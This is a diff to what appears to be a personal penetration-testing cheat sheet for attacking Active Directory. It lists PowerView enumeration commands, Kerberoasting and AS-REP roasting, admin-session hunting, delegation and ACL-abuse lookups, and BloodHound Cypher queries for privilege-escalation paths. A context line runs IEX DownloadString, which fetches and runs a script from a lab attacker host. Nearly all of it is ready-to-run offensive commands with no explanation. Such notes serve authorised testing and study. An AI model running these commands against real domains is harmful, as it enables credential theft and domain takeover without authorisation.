@@ -769,11 +769,13 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerVie
 
 # cmd
 Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
-Find-LocalAdminAccess
+Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol
+Get-NetSession -Verbose -ComputerName web04 
+
 Get-LocalGroupMember Administrators
+Find-LocalAdminAccess
 Find-DomainUserLocation
 Invoke-UserHunter
-Get-NetSession -Verbose -ComputerName web04 
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 
 # discription
@@ -783,6 +785,9 @@ Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 # Kerberoastable
 Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,memberof
 Invoke-Kerberoast
+# Delegation 
+Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
+Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" 
 
 # GenericAll to User
 $geneall = Get-ObjectAcl -Identity "UserName" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
@@ -872,6 +877,12 @@ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:S
 
 # description
 MATCH (u:User) WHERE u.description IS NOT NULL RETURN u
+
+# Delegation unconstrained
+MATCH (c:Computer {unconstraineddelegation:true}) return c
+
+# Evil Domain User
+MATCH p=(m:Group)-[r:Owns|:WriteDacl|:GenericAll|:WriteOwner|:ExecuteDCOM|:GenericWrite|:AllowedToDelegate|:ForceChangePassword]->(n:Computer) WHERE m.name STARTS WITH 'DOMAIN USERS' RETURN p
 
 # ANY PATH
 MATCH p = shortestPath((n)-[*1..]->(c)) WHERE n.name =~ '(?i)ここにUser名.*' AND NOT c=n RETURN p
